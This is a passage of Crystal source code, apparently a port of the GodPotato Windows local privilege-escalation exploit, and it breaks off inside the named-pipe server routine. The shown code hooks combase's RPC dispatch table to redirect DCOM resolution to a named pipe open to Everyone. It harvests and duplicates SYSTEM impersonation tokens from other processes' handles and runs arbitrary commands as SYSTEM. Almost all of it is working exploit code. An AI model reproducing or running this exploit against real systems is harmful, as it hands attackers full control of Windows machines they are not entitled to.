require "option_parser"

# ─────────────── Lib blocks ─────────────────────────────
# Extend LibC with Win32 functions not in Crystal's stdlib.
# DO NOT redeclare: ReadFile, WriteFile, CreateFileW, LocalFree,
# ConvertSidToStringSidW, CloseHandle, GetLastError, SetLastError,
# GetCurrentProcess, GetCurrentProcessId, GetCurrentThread,
# DuplicateHandle, OpenProcess, CreatePipe, SetHandleInformation,
# VirtualProtect — those are in Crystal's stdlib.
lib LibC
  fun GetModuleHandleW(name : UInt16*) : Void*
  fun GetCurrentProcess() : Void*
  fun GetCurrentProcessId() : UInt32
  fun GetCurrentThread() : Void*
  fun VirtualProtect(addr : Void*, size : UInt64, new_protect : UInt32, old_protect : UInt32*) : Int32
  fun OpenProcess(access : UInt32, inherit : Int32, pid : UInt32) : Void*
  fun DuplicateHandle(source_proc : Void*, source_handle : Void*,
    target_proc : Void*, target_handle : Void**, access : UInt32,
    inherit : Int32, options : UInt32) : Int32
  fun CreatePipe(read_pipe : Void**, write_pipe : Void**, security : Void*, size : UInt32) : Int32
  fun SetHandleInformation(obj : Void*, mask : UInt32, flags : UInt32) : Int32
  fun CreateNamedPipeW(name : UInt16*, open_mode : UInt32, pipe_mode : UInt32,
    max_instances : UInt32, out_buf : UInt32, in_buf : UInt32,
    timeout : UInt32, security : Void*) : Void*
  fun ConnectNamedPipe(pipe : Void*, overlapped : Void*) : Int32
  fun PeekNamedPipe(pipe : Void*, buffer : UInt8*, size : UInt32,
    read : UInt32*, avail : UInt32*, left : UInt32*) : Int32
  fun GlobalAlloc(flags : UInt32, bytes : UInt64) : Void*
  fun GlobalLock(mem : Void*) : Void*
  fun GlobalUnlock(mem : Void*) : Int32
  fun GlobalSize(mem : Void*) : UInt64
  fun Sleep(ms : UInt32) : Void
  fun CreateThread(security : Void*, stack_size : UInt64,
    start_address : Pointer(Void) -> UInt32, parameter : Void*,
    creation_flags : UInt32, thread_id : UInt32*) : Void*
  fun WaitForSingleObject(handle : Void*, ms : UInt32) : UInt32
  fun ConvertStringSecurityDescriptorToSecurityDescriptorW(
    sd : UInt16*, revision : UInt32, out_sd : Void**, out_size : UInt32*) : Int32
  fun ImpersonateNamedPipeClient(pipe : Void*) : Int32
  fun RevertToSelf() : Int32
  fun OpenProcessToken(process : Void*, access : UInt32, token : Void**) : Int32
  fun OpenThreadToken(thread : Void*, access : UInt32, open_as_self : Int32, token : Void**) : Int32
  fun GetTokenInformation(token : Void*, info_class : Int32, info : Void*,
    info_len : UInt32, return_len : UInt32*) : Int32
  fun DuplicateTokenEx(existing : Void*, access : UInt32, sa : Void*,
    imp_level : Int32, token_type : Int32, new_token : Void**) : Int32
  fun CreateProcessWithTokenW(token : Void*, logon_flags : UInt32,
    app : UInt16*, cmdline : UInt16*, creation : UInt32, env : Void*,
    dir : UInt16*, si : Void*, pi : Void*) : Int32
  fun CreateProcessAsUserW(token : Void*, app : UInt16*, cmdline : UInt16*,
    proc_attr : Void*, thread_attr : Void*, inherit : Int32,
    creation : UInt32, env : Void*, dir : UInt16*, si : Void*, pi : Void*) : Int32
  fun GetSidSubAuthorityCount(sid : Void*) : UInt8*
  fun GetSidSubAuthority(sid : Void*, sub_auth : UInt32) : UInt32*
end

lib LibGC
  struct GcStackBase
    mem_base : Void*
  end
  fun GC_register_my_thread(sb : GcStackBase*) : Int32
  fun GC_unregister_my_thread() : Void
  fun GC_get_stack_base(sb : GcStackBase*) : Int32
end

@[Link("ntdll")]
lib Nt
  fun NtQuerySystemInformation(info_class : UInt32, info : Void*,
    info_length : UInt32, return_length : UInt32*) : UInt32
end

@[Link("psapi")]
lib Ps
  fun GetModuleInformation(process : Void*, mod : Void*, info : Void*, size : UInt32) : Int32
  fun EnumProcesses(pids : UInt32*, size : UInt32, needed : UInt32*) : Int32
end

@[Link("ole32")]
lib Ole32
  fun CoInitializeEx(reserved : Void*, coinit : UInt32) : Int32
  fun CoUninitialize() : Void
  fun CreateStreamOnHGlobal(hglobal : Void*, delete_on_release : Int32, stm : Void**) : Int32
  fun GetHGlobalFromStream(stm : Void*, hglobal : Void**) : Int32
  fun CoMarshalInterface(stm : Void*, riid : Void*, punk : Void*,
    ctx : UInt32, reserved : Void*, flags : UInt32) : Int32
  fun CoUnmarshalInterface(stm : Void*, riid : Void*, ppv : Void**) : Int32
end


# ─────────────── Constants ──────────────────────────────
INVALID_HANDLE_VALUE = Pointer(Void).new(UInt64::MAX)
INFINITE_WAIT        = 0xFFFFFFFF_u32

PIPE_ACCESS_DUPLEX       = 0x03_u32
PIPE_TYPE_BYTE           = 0x00_u32
PIPE_READMODE_BYTE       = 0x00_u32
PIPE_WAIT                = 0x00_u32
PIPE_UNLIMITED_INSTANCES = 255_u32
ERROR_PIPE_CONNECTED     = 0x217_u32

PAGE_READWRITE = 0x04_u32

TOKEN_ASSIGN_PRIMARY    = 0x0001_u32
TOKEN_DUPLICATE         = 0x0002_u32
TOKEN_IMPERSONATE       = 0x0004_u32
TOKEN_QUERY             = 0x0008_u32
TOKEN_QUERY_SOURCE      = 0x0010_u32
TOKEN_ADJUST_PRIVILEGES = 0x0020_u32
TOKEN_ADJUST_GROUPS     = 0x0040_u32
TOKEN_ADJUST_DEFAULT    = 0x0080_u32
TOKEN_ADJUST_SESSIONID  = 0x0100_u32
TOKEN_ELEVATION = TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE |
  TOKEN_IMPERSONATE | TOKEN_ADJUST_PRIVILEGES |
  TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID

PROCESS_QUERY_INFORMATION         = 0x0400_u32
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000_u32
PROCESS_DUP_HANDLE                = 0x0040_u32

SYSTEM_EXTENDED_HANDLE_INFORMATION = 0x40_u32
STATUS_INFO_LENGTH_MISMATCH        = 0xC0000004_u32
STATUS_SUCCESS                     = 0x00000000_u32
DUPLICATE_SAME_ACCESS              = 0x00000002_u32

STARTF_USESTDHANDLES = 0x00000100_u32
CREATE_NO_WINDOW     = 0x08000000_u32
HANDLE_FLAG_INHERIT  = 0x00000001_u32

SECURITY_IMPERSONATION  = 2_i32
TOKEN_PRIMARY           = 1_i32
TOKEN_IMPERSONATION_TYPE = 2_i32

TOKEN_USER_CLASS             = 1_i32
TOKEN_IMPERSONATION_LV_CLASS = 9_i32
TOKEN_INTEGRITY_LEVEL_CLASS  = 25_i32

OBJREF_SIGNATURE = 0x574f454d_u32
OBJREF_STANDARD  = 0x01_u32
EPM_PROTOCOL_TCP = 0x07_u16

IID_IUNKNOWN = Bytes[
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
]

ORCB_GUID_BYTES = Bytes[
  0x70, 0x07, 0xf7, 0x18, 0x64, 0x8e, 0xcf, 0x11,
  0x9a, 0xf1, 0x00, 0x20, 0xaf, 0x6e, 0x72, 0xf4,
]


# ─────────────── Structs ────────────────────────────────
struct SecurityAttributesCR
  property n_length : UInt32 = 0_u32
  property lp_security_descriptor : Pointer(Void) = Pointer(Void).null
  property b_inherit_handle : Int32 = 0_i32

  def initialize(@n_length = 0_u32, @lp_security_descriptor = Pointer(Void).null, @b_inherit_handle = 0_i32)
  end
end

struct ModuleInfoCR
  property base_of_dll : Pointer(Void) = Pointer(Void).null
  property size_of_image : UInt32 = 0_u32
  property entry_point : Pointer(Void) = Pointer(Void).null

  def initialize
  end
end

struct WinGUID
  property data1 : UInt32 = 0_u32
  property data2 : UInt16 = 0_u16
  property data3 : UInt16 = 0_u16
  property data4 : StaticArray(UInt8, 8) = StaticArray(UInt8, 8).new(0_u8)

  def initialize
  end
end

struct RpcVersion
  property major : UInt16 = 0_u16
  property minor : UInt16 = 0_u16

  def initialize
  end
end

struct RpcSyntaxIdentifier
  property syntax_guid : WinGUID = WinGUID.new
  property syntax_version : RpcVersion = RpcVersion.new

  def initialize
  end
end

struct RpcServerInterface
  property length : UInt32 = 0_u32
  property interface_id : RpcSyntaxIdentifier = RpcSyntaxIdentifier.new
  property transfer_syntax : RpcSyntaxIdentifier = RpcSyntaxIdentifier.new
  property dispatch_table : Pointer(Void) = Pointer(Void).null
  property rpc_protseq_endpoint_count : UInt32 = 0_u32
  property rpc_protseq_endpoint : Pointer(Void) = Pointer(Void).null
  property default_manager_epv : Pointer(Void) = Pointer(Void).null
  property interpreter_info : Pointer(Void) = Pointer(Void).null
  property flags : UInt32 = 0_u32

  def initialize
  end
end

struct RpcDispatchTable
  property dispatch_table_count : UInt32 = 0_u32
  property dispatch_table : Pointer(Void) = Pointer(Void).null
  property reserved : Int64 = 0_i64

  def initialize
  end
end

struct MidlServerInfo
  property p_stub_desc : Pointer(Void) = Pointer(Void).null
  property dispatch_table : Pointer(Void) = Pointer(Void).null
  property proc_string : Pointer(Void) = Pointer(Void).null
  property fmt_string_offset : Pointer(Void) = Pointer(Void).null
  property thunk_table : Pointer(Void) = Pointer(Void).null
  property p_transfer_syntax : Pointer(Void) = Pointer(Void).null
  property n_count : Pointer(Void) = Pointer(Void).null
  property p_syntax_info : Pointer(Void) = Pointer(Void).null

  def initialize
  end
end

struct StartupInfoW
  property cb : UInt32 = 0_u32
  property lp_reserved : Pointer(Void) = Pointer(Void).null
  property lp_desktop : Pointer(UInt16) = Pointer(UInt16).null
  property lp_title : Pointer(UInt16) = Pointer(UInt16).null
  property dw_x : UInt32 = 0_u32
  property dw_y : UInt32 = 0_u32
  property dw_x_size : UInt32 = 0_u32
  property dw_y_size : UInt32 = 0_u32
  property dw_x_count_chars : UInt32 = 0_u32
  property dw_y_count_chars : UInt32 = 0_u32
  property dw_fill_attribute : UInt32 = 0_u32
  property dw_flags : UInt32 = 0_u32
  property w_show_window : UInt16 = 0_u16
  property cb_reserved2 : UInt16 = 0_u16
  property lp_reserved2 : Pointer(Void) = Pointer(Void).null
  property h_std_input : Pointer(Void) = Pointer(Void).null
  property h_std_output : Pointer(Void) = Pointer(Void).null
  property h_std_error : Pointer(Void) = Pointer(Void).null

  def initialize
    @cb = sizeof(StartupInfoW).to_u32
  end
end

struct ProcessInformationCR
  property h_process : Pointer(Void) = Pointer(Void).null
  property h_thread : Pointer(Void) = Pointer(Void).null
  property dw_process_id : UInt32 = 0_u32
  property dw_thread_id : UInt32 = 0_u32

  def initialize
  end
end

@[Packed]
struct SystemHandleTableEntryInfoEx
  property object_pointer : UInt64 = 0_u64
  property process_id : UInt64 = 0_u64
  property handle_value : UInt64 = 0_u64
  property granted_access : UInt32 = 0_u32
  property creator_back_track_index : UInt16 = 0_u16
  property object_type : UInt16 = 0_u16
  property handle_attributes : UInt32 = 0_u32
  property reserved : UInt32 = 0_u32

  def initialize
  end
end


# ─────────────── OBJREF ─────────────────────────────────
struct SecurityBinding
  property authn_svc : UInt16
  property authz_svc : UInt16

  def initialize(@authn_svc : UInt16, @authz_svc : UInt16)
  end

  def get_bytes : Bytes
    io = IO::Memory.new
    io.write_bytes(@authn_svc, IO::ByteFormat::LittleEndian)
    io.write_bytes(@authz_svc, IO::ByteFormat::LittleEndian)
    io.write(Bytes[0, 0, 0, 0])
    io.to_slice
  end
end

struct StringBinding
  property tower_id : UInt16
  property network_address : String

  def initialize(@tower_id : UInt16, @network_address : String)
  end

  def get_bytes : Bytes
    io = IO::Memory.new
    io.write_bytes(@tower_id, IO::ByteFormat::LittleEndian)
    @network_address.each_char do |c|
      io.write_bytes(c.ord.to_u16, IO::ByteFormat::LittleEndian)
    end
    io.write(Bytes[0, 0, 0, 0])
    io.to_slice
  end
end

struct DualStringArray
  property string_binding : StringBinding
  property security_binding : SecurityBinding

  def initialize(@string_binding : StringBinding, @security_binding : SecurityBinding)
  end

  def get_bytes : Bytes
    sb = @string_binding.get_bytes
    sec = @security_binding.get_bytes
    num_entries = (sb.size + sec.size) // 2
    sec_offset = sb.size // 2
    io = IO::Memory.new
    io.write_bytes(num_entries.to_u16, IO::ByteFormat::LittleEndian)
    io.write_bytes(sec_offset.to_u16, IO::ByteFormat::LittleEndian)
    io.write(sb)
    io.write(sec)
    io.to_slice
  end
end

class StandardObjRef
  getter flags : UInt32
  getter public_refs : UInt32
  getter oxid : UInt64
  getter oid : UInt64
  getter ipid : Bytes

  def initialize(@flags : UInt32, @public_refs : UInt32, @oxid : UInt64, @oid : UInt64, @ipid : Bytes)
  end

  def get_bytes(dsa : DualStringArray?) : Bytes
    io = IO::Memory.new
    io.write_bytes(@flags, IO::ByteFormat::LittleEndian)
    io.write_bytes(@public_refs, IO::ByteFormat::LittleEndian)
    io.write_bytes(@oxid, IO::ByteFormat::LittleEndian)
    io.write_bytes(@oid, IO::ByteFormat::LittleEndian)
    io.write(@ipid)
    if d = dsa
      io.write(d.get_bytes)
    end
    io.to_slice
  end
end

class ObjRef
  getter guid : Bytes
  getter standard_objref : StandardObjRef

  def initialize(@guid : Bytes, @standard_objref : StandardObjRef)
  end

  def self.parse(data : Bytes) : ObjRef
    io = IO::Memory.new(data)
    sig = io.read_bytes(UInt32, IO::ByteFormat::LittleEndian)
    raise "Invalid OBJREF signature: 0x#{sig.to_s(16)}" unless sig == OBJREF_SIGNATURE
    flags = io.read_bytes(UInt32, IO::ByteFormat::LittleEndian)
    guid = Bytes.new(16)
    io.read_fully(guid)
    std_flags = io.read_bytes(UInt32, IO::ByteFormat::LittleEndian)
    pub_refs = io.read_bytes(UInt32, IO::ByteFormat::LittleEndian)
    oxid = io.read_bytes(UInt64, IO::ByteFormat::LittleEndian)
    oid = io.read_bytes(UInt64, IO::ByteFormat::LittleEndian)
    ipid = Bytes.new(16)
    io.read_fully(ipid)
    ObjRef.new(guid, StandardObjRef.new(std_flags, pub_refs, oxid, oid, ipid))
  end

  def get_bytes(dsa : DualStringArray) : Bytes
    io = IO::Memory.new
    io.write_bytes(OBJREF_SIGNATURE, IO::ByteFormat::LittleEndian)
    io.write_bytes(OBJREF_STANDARD, IO::ByteFormat::LittleEndian)
    io.write(@guid)
    io.write(@standard_objref.get_bytes(dsa))
    io.to_slice
  end
end


# ─────────────── Helpers ────────────────────────────────
def sunday_search(text : Bytes, pattern : Bytes) : Array(Int32)
  table = StaticArray(Int32, 512).new(-1)
  pattern.each_with_index { |b, i| table[b] = i }

  results = [] of Int32
  i = 0
  plen = pattern.size
  tlen = text.size

  while i <= tlen - plen
    j = 0
    while j < plen && text[i + j] == pattern[j]
      j += 1
    end
    results << i if j == plen
    i += plen
    if i < tlen
      i -= table[text[i]]
    end
  end

  results
end

def read_wide_string(ptr : Pointer(UInt16)) : String
  return "" if ptr.null?
  String.build do |s|
    i = 0
    loop do
      ch = ptr[i]
      break if ch == 0
      s << ch.unsafe_chr
      i += 1
    end
  end
end

def get_token_sid(token : Pointer(Void)) : String?
  buf_len = 0_u32
  LibC.GetTokenInformation(token, TOKEN_USER_CLASS, Pointer(Void).null, 0_u32, pointerof(buf_len))
  return nil if buf_len == 0

  buf = Bytes.new(buf_len)
  return nil unless LibC.GetTokenInformation(
    token, TOKEN_USER_CLASS, buf.to_unsafe.as(Pointer(Void)),
    buf_len, pointerof(buf_len)) != 0

  sid_ptr = Pointer(Pointer(Void)).new(buf.to_unsafe.address).value
  str_sid = Pointer(UInt16).null
  if LibC.ConvertSidToStringSidW(sid_ptr.as(Pointer(LibC::SID)), pointerof(str_sid).as(Pointer(LibC::LPWSTR))) != 0
    result = read_wide_string(str_sid)
    LibC.LocalFree(str_sid.as(Pointer(Void)))
    return result
  end
  nil
end

def get_integrity_level(token : Pointer(Void)) : UInt32
  buf_len = 0_u32
  LibC.GetTokenInformation(token, TOKEN_INTEGRITY_LEVEL_CLASS, Pointer(Void).null, 0_u32, pointerof(buf_len))
  return 0_u32 if buf_len == 0

  buf = Bytes.new(buf_len)
  return 0_u32 unless LibC.GetTokenInformation(
    token, TOKEN_INTEGRITY_LEVEL_CLASS, buf.to_unsafe.as(Pointer(Void)),
    buf_len, pointerof(buf_len)) != 0

  sid_ptr = Pointer(Pointer(Void)).new(buf.to_unsafe.address).value
  return 0_u32 if sid_ptr.null?

  sub_count_ptr = LibC.GetSidSubAuthorityCount(sid_ptr)
  sub_count = sub_count_ptr.value
  rid_ptr = LibC.GetSidSubAuthority(sid_ptr, sub_count.to_u32 - 1)
  rid_ptr.value
end

def get_impersonation_level(token : Pointer(Void)) : Int32
  level = 0_u32
  buf_len = sizeof(UInt32).to_u32
  if LibC.GetTokenInformation(
      token, TOKEN_IMPERSONATION_LV_CLASS,
      pointerof(level).as(Pointer(Void)), buf_len, pointerof(buf_len)) != 0
    return level.to_i32
  end
  -1
end

def query_system_handles : {Pointer(Void), UInt32}?
  buf_size = 1024_u32 * 1024
  buf = Pointer(UInt8).malloc(buf_size).as(Pointer(Void))
  ret_len = 0_u32

  status = Nt.NtQuerySystemInformation(
    SYSTEM_EXTENDED_HANDLE_INFORMATION, buf, buf_size, pointerof(ret_len))
  while status == STATUS_INFO_LENGTH_MISMATCH
    buf_size *= 2
    buf = Pointer(UInt8).malloc(buf_size).as(Pointer(Void))
    status = Nt.NtQuerySystemInformation(
      SYSTEM_EXTENDED_HANDLE_INFORMATION, buf, buf_size, pointerof(ret_len))
  end

  if status != STATUS_SUCCESS
    return nil
  end
  {buf, ret_len}
end

def detect_token_object_type : Int32
  my_token = Pointer(Void).null
  ok = LibC.OpenThreadToken(
    LibC.GetCurrentThread, TOKEN_QUERY, 1, pointerof(my_token))
  if ok == 0 || my_token.null?
    ok = LibC.OpenProcessToken(
      LibC.GetCurrentProcess, TOKEN_QUERY, pointerof(my_token))
  end
  return -1 if my_token.null?

  my_pid = LibC.GetCurrentProcessId.to_u64

  result = query_system_handles
  unless result
    LibC.CloseHandle(my_token)
    return -1
  end
  buf, _ = result

  num_handles = Pointer(UInt64).new(buf.address).value
  entry_offset = sizeof(UInt64) * 2
  entry_size = sizeof(SystemHandleTableEntryInfoEx)

  token_type = -1_i32
  num_handles.times do |i|
    addr = buf.address + entry_offset + i * entry_size
    entry = Pointer(SystemHandleTableEntryInfoEx).new(addr).value
    if entry.process_id == my_pid && entry.handle_value == my_token.address.to_u64
      token_type = entry.object_type.to_i32
      break
    end
  end

  LibC.CloseHandle(my_token)
  token_type
end

def find_system_token(log : Array(String)? = nil) : Pointer(Void)?
  log.try &.<< "[*] Start Search System Token"

  token_type = detect_token_object_type
  if token_type < 0
    log.try &.<< "[-] Could not find System Token"
    return nil
  end

  result = query_system_handles
  unless result
    log.try &.<< "[-] Could not find System Token"
    return nil
  end
  buf, _ = result

  num_handles = Pointer(UInt64).new(buf.address).value
  entry_offset = sizeof(UInt64) * 2
  entry_size = sizeof(SystemHandleTableEntryInfoEx)
  local_proc = LibC.GetCurrentProcess

  last_pid = 0_u64
  proc_handle = Pointer(Void).null
  found_token : Pointer(Void)? = nil

  num_handles.times do |i|
    addr = buf.address + entry_offset + i * entry_size
    entry = Pointer(SystemHandleTableEntryInfoEx).new(addr).value

    next if entry.object_type.to_i32 != token_type
    next if entry.granted_access == 0x0012019f_u32

    h_pid = entry.process_id
    if h_pid != last_pid
      LibC.CloseHandle(proc_handle) unless proc_handle.null?
      proc_handle = Pointer(Void).null
      proc_handle = LibC.OpenProcess(
        PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, 0, h_pid.to_u32)
      if proc_handle.null?
        proc_handle = LibC.OpenProcess(
          PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, 0, h_pid.to_u32)
      end
      last_pid = h_pid
    end

    next if proc_handle.null?

    dup_token = Pointer(Void).null
    next if LibC.DuplicateHandle(
      proc_handle, Pointer(Void).new(entry.handle_value),
      local_proc, pointerof(dup_token),
      0_u32, 0, DUPLICATE_SAME_ACCESS) == 0

    sid = get_token_sid(dup_token)
    unless sid == "S-1-5-18"
      LibC.CloseHandle(dup_token)
      next
    end

    imp_level = get_impersonation_level(dup_token)
    integrity = get_integrity_level(dup_token)

    if imp_level >= 2 && integrity >= 0x4000
      new_token = Pointer(Void).null
      if LibC.DuplicateTokenEx(
          dup_token, TOKEN_ELEVATION, Pointer(Void).null,
          SECURITY_IMPERSONATION, TOKEN_IMPERSONATION_TYPE,
          pointerof(new_token)) != 0
        log.try &.<< "[*] PID : #{h_pid} Token:0x#{entry.handle_value.to_s(16)}  User: SYSTEM ImpersonationLevel: Impersonation"
        LibC.CloseHandle(dup_token)
        found_token = new_token
        break
      end
    end

    LibC.CloseHandle(dup_token)
  end

  LibC.CloseHandle(proc_handle) unless proc_handle.null?

  unless found_token
    log.try &.<< "[-] Could not find System Token"
  end
  found_token
end


# ─────────────── Process Creation ───────────────────────
def create_process_read_output(token_handle : Pointer(Void), command_line : String)
  sa = SecurityAttributesCR.new(sizeof(SecurityAttributesCR).to_u32, Pointer(Void).null, 1)

  stdout_read = Pointer(Void).null
  stdout_write = Pointer(Void).null
  if LibC.CreatePipe(pointerof(stdout_read), pointerof(stdout_write),
      pointerof(sa).as(Pointer(Void)), 8196_u32) == 0
    puts "[!] CreatePipe failed: #{LibC.GetLastError}"
    return
  end

  LibC.SetHandleInformation(stdout_read, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)
  LibC.SetHandleInformation(stdout_write, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)

  primary_token = Pointer(Void).null
  has_primary = LibC.DuplicateTokenEx(
    token_handle, TOKEN_ELEVATION, Pointer(Void).null,
    SECURITY_IMPERSONATION, TOKEN_PRIMARY,
    pointerof(primary_token)) != 0
  primary_token = token_handle unless has_primary

  si = StartupInfoW.new
  si.h_std_output = stdout_write
  si.h_std_error = stdout_write
  si.dw_flags = STARTF_USESTDHANDLES

  pi = ProcessInformationCR.new
  cmdline_w = command_line.to_utf16
  created = false

  if LibC.CreateProcessWithTokenW(
      primary_token, 0_u32, Pointer(UInt16).null, cmdline_w.to_unsafe,
      CREATE_NO_WINDOW, Pointer(Void).null, Pointer(UInt16).null,
      pointerof(si).as(Pointer(Void)), pointerof(pi).as(Pointer(Void))) != 0
    created = true
  elsif LibC.CreateProcessAsUserW(
      primary_token, Pointer(UInt16).null, cmdline_w.to_unsafe,
      Pointer(Void).null, Pointer(Void).null, 1,
      CREATE_NO_WINDOW, Pointer(Void).null, Pointer(UInt16).null,
      pointerof(si).as(Pointer(Void)), pointerof(pi).as(Pointer(Void))) != 0
    created = true
  end

  LibC.CloseHandle(primary_token) if has_primary

  if created
    puts "[*] process start with pid #{pi.dw_process_id}"
    LibC.CloseHandle(stdout_write)
    stdout_write = Pointer(Void).null

    buf = Bytes.new(4096)
    bytes_avail = 0_u32

    loop do
      break unless LibC.PeekNamedPipe(
        stdout_read, Pointer(UInt8).null, 0_u32,
        Pointer(UInt32).null, pointerof(bytes_avail), Pointer(UInt32).null) != 0
      if bytes_avail > 0
        bytes_read = 0_u32
        if LibC.ReadFile(stdout_read, buf.to_unsafe.as(Pointer(Void)), 4096_u32,
            pointerof(bytes_read), Pointer(LibC::OVERLAPPED).null) != 0
          STDOUT.write(buf[0, bytes_read])
          STDOUT.flush
        end
      end
    end

    LibC.CloseHandle(pi.h_process)
    LibC.CloseHandle(pi.h_thread)
  else
    puts "[!] CreateProcess failed. Error: #{LibC.GetLastError}"
  end

  LibC.CloseHandle(stdout_write) unless stdout_write.null?
  LibC.CloseHandle(stdout_read)
end


# ─────────────── Hook State ─────────────────────────────
module HookState
  @@client_pipe = ""

  def self.client_pipe=(value : String)
    @@client_pipe = value
  end

  def self.hook_impl(pp_bindings : Pointer(Void)) : Int32
    endpoints = [@@client_pipe, "ncacn_ip_tcp:0"]
    entries_size = 3
    endpoints.each { |ep| entries_size += ep.size + 1 }

    memory_size = (entries_size * 2 + 10).to_u64
    pdsa = LibC.GlobalAlloc(0x0040_u32, memory_size)
    return -1 if pdsa.null?

    base = pdsa.address
    offset = 0_u64
    Pointer(Int16).new(base + offset).value = entries_size.to_i16
    offset += 2
    Pointer(Int16).new(base + offset).value = (entries_size - 2).to_i16
    offset += 2

    endpoints.each do |ep|
      ep.each_char do |ch|
        Pointer(Int16).new(base + offset).value = ch.ord.to_i16
        offset += 2
      end
      offset += 2
    end

    Pointer(Pointer(Void)).new(pp_bindings.address).value = pdsa
    0_i32
  end

  {% for n in (4..14) %}
    def self.hook_func_{{n}}(
      {% for i in 0...n %}p{{i}} : Pointer(Void){% if i < n - 1 %}, {% end %}{% end %}
    ) : Int32
      hook_impl(p{{n - 2}})
    end
  {% end %}

  def self.get_hook_pointer(param_count : UInt32) : Pointer(Void)
    {% begin %}
    case param_count
    {% for n in (4..14) %}
    when {{n}}
      (->({% for i in 0...n %}p{{i}} : Pointer(Void){% if i < n - 1 %}, {% end %}{% end %}) : Int32 {
        HookState.hook_impl(p{{n - 2}})
      }).pointer
    {% end %}
    else
      raise "Unsupported param count: #{param_count}"
    end
    {% end %}
  end
end


# ─────────────── Pipe Server Thread ─────────────────────
module PipeServerBridge
  @@ctx : GodPotatoContext? = nil

  def self.ctx=(value : GodPotatoContext?)
    @@ctx = value
  end

  def self.ctx : GodPotatoContext?
    @@ctx
  end
end

PIPE_SERVER_THREAD_PROC = ->(param : Pointer(Void)) : UInt32 {
  sb = LibGC::GcStackBase.new(mem_base: Pointer(Void).null)
  LibGC.GC_get_stack_base(pointerof(sb))
  LibGC.GC_register_my_thread(pointerof(sb))

  if ctx = PipeServerBridge.ctx
    ctx.run_pipe_server
  end

  LibGC.GC_unregister_my_thread
  0_u32
}


# ─────────────── GodPotatoContext ───────────────────────
class GodPotatoContext
  getter combase_module : UInt64 = 0_u64
  getter dispatch_table_ptr : UInt64 = 0_u64
  getter use_protseq_function_ptr : UInt64 = 0_u64
  getter use_protseq_param_count : UInt32 = 0_u32

  @dispatch_table = [] of UInt64
  @fmt_string_offset = [] of Int16
  @proc_string : UInt64 = 0_u64
  @is_hooked = false
  @is_started = false
  @thread_handle : Pointer(Void) = Pointer(Void).null
  @system_token : Pointer(Void)? = nil
  @server_pipe : String
  @pipe_name : String
  @log = [] of String

  def initialize(@pipe_name = "GodPotato")
    @server_pipe = "\\\\.\\pipe\\#{@pipe_name}\\pipe\\epmapper"
    HookState.client_pipe = "ncacn_np:localhost/pipe/#{@pipe_name}[\\pipe\\epmapper]"

    init_context

    raise "No combase module found" if @combase_module == 0
    raise "Cannot find IDL structure" if @dispatch_table.empty? || @proc_string == 0 || @use_protseq_function_ptr == 0
    raise "UseProtseqFunctionParamCount == #{@use_protseq_param_count}" unless (4..14).includes?(@use_protseq_param_count)
  end

  private def init_context
    combase_name = "combase.dll".to_utf16
    h_combase = LibC.GetModuleHandleW(combase_name.to_unsafe)
    return if h_combase.null?

    @combase_module = h_combase.address

    mod_info = ModuleInfoCR.new
    Ps.GetModuleInformation(
      LibC.GetCurrentProcess, h_combase,
      pointerof(mod_info).as(Pointer(Void)), sizeof(ModuleInfoCR).to_u32)

    module_size = mod_info.size_of_image
    dll_content = Bytes.new(module_size)
    dll_content.to_unsafe.copy_from(h_combase.as(Pointer(UInt8)), module_size)

    rsi_size = sizeof(RpcServerInterface).to_u32
    pattern_io = IO::Memory.new
    pattern_io.write_bytes(rsi_size, IO::ByteFormat::LittleEndian)
    pattern_io.write(ORCB_GUID_BYTES)
    pattern = pattern_io.to_slice

    offsets = sunday_search(dll_content, pattern)
    return if offsets.empty?

    rsi_addr = @combase_module + offsets[0].to_u64
    rsi = Pointer(RpcServerInterface).new(rsi_addr).value

    rpc_dt = Pointer(RpcDispatchTable).new(rsi.dispatch_table.address).value
    midl_info = Pointer(MidlServerInfo).new(rsi.interpreter_info.address).value

    @dispatch_table_ptr = midl_info.dispatch_table.address
    @proc_string = midl_info.proc_string.address
    fmt_offset_ptr = midl_info.fmt_string_offset.address
    count = rpc_dt.dispatch_table_count

    @dispatch_table = [] of UInt64
    count.times do |i|
      ptr_val = Pointer(UInt64).new(@dispatch_table_ptr + i.to_u64 * 8).value
      @dispatch_table << ptr_val
    end

    @fmt_string_offset = [] of Int16
    count.times do |i|
      val = Pointer(Int16).new(fmt_offset_ptr + i.to_u64 * 2).value
      @fmt_string_offset << val
    end

    @use_protseq_function_ptr = @dispatch_table[0]
    offset = @fmt_string_offset[0].to_i64
    addr = (@proc_string.to_i64 + offset + 19).to_u64
    @use_protseq_param_count = Pointer(UInt8).new(addr).value.to_u32
  end

  def hook_rpc
    hook_ptr = HookState.get_hook_pointer(@use_protseq_param_count)

    old_protect = 0_u32
    table_size = 8_u64 * @dispatch_table.size
    LibC.VirtualProtect(
      Pointer(Void).new(@dispatch_table_ptr), table_size,
      PAGE_READWRITE, pointerof(old_protect))

    Pointer(Pointer(Void)).new(@dispatch_table_ptr).value = hook_ptr

    @is_hooked = true
    puts "[*] HookRPC"
  end

  private def log(msg : String)
    @log << msg
  end

  def run_pipe_server
    sddl = "D:(A;OICI;GA;;;WD)".to_utf16
    sec_desc = Pointer(Void).null
    sec_desc_size = 0_u32
    LibC.ConvertStringSecurityDescriptorToSecurityDescriptorW(
      sddl.to_unsafe, 1_u32, pointerof(sec_desc), pointerof(sec_desc_size))

    sa = SecurityAttributesCR.new(sizeof(SecurityAttributesCR).to_u32, sec_desc, 0)

    pipe_name_w = @server_pipe.to_utf16
    pipe_handle = LibC.CreateNamedPipeW(
      pipe_name_w.to_unsafe,
      PIPE_ACCESS_DUPLEX,
      PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
      PIPE_UNLIMITED_INSTANCES,
      521_u32, 0_u32, 123_u32,
      pointerof(sa).as(Pointer(Void)))

    log "[*] CreateNamedPipe #{@server_pipe}"

    if pipe_handle == INVALID_HANDLE_VALUE
      log "[!] CreateNamedPipe failed error:#{LibC.GetLastError}"
      return
    end

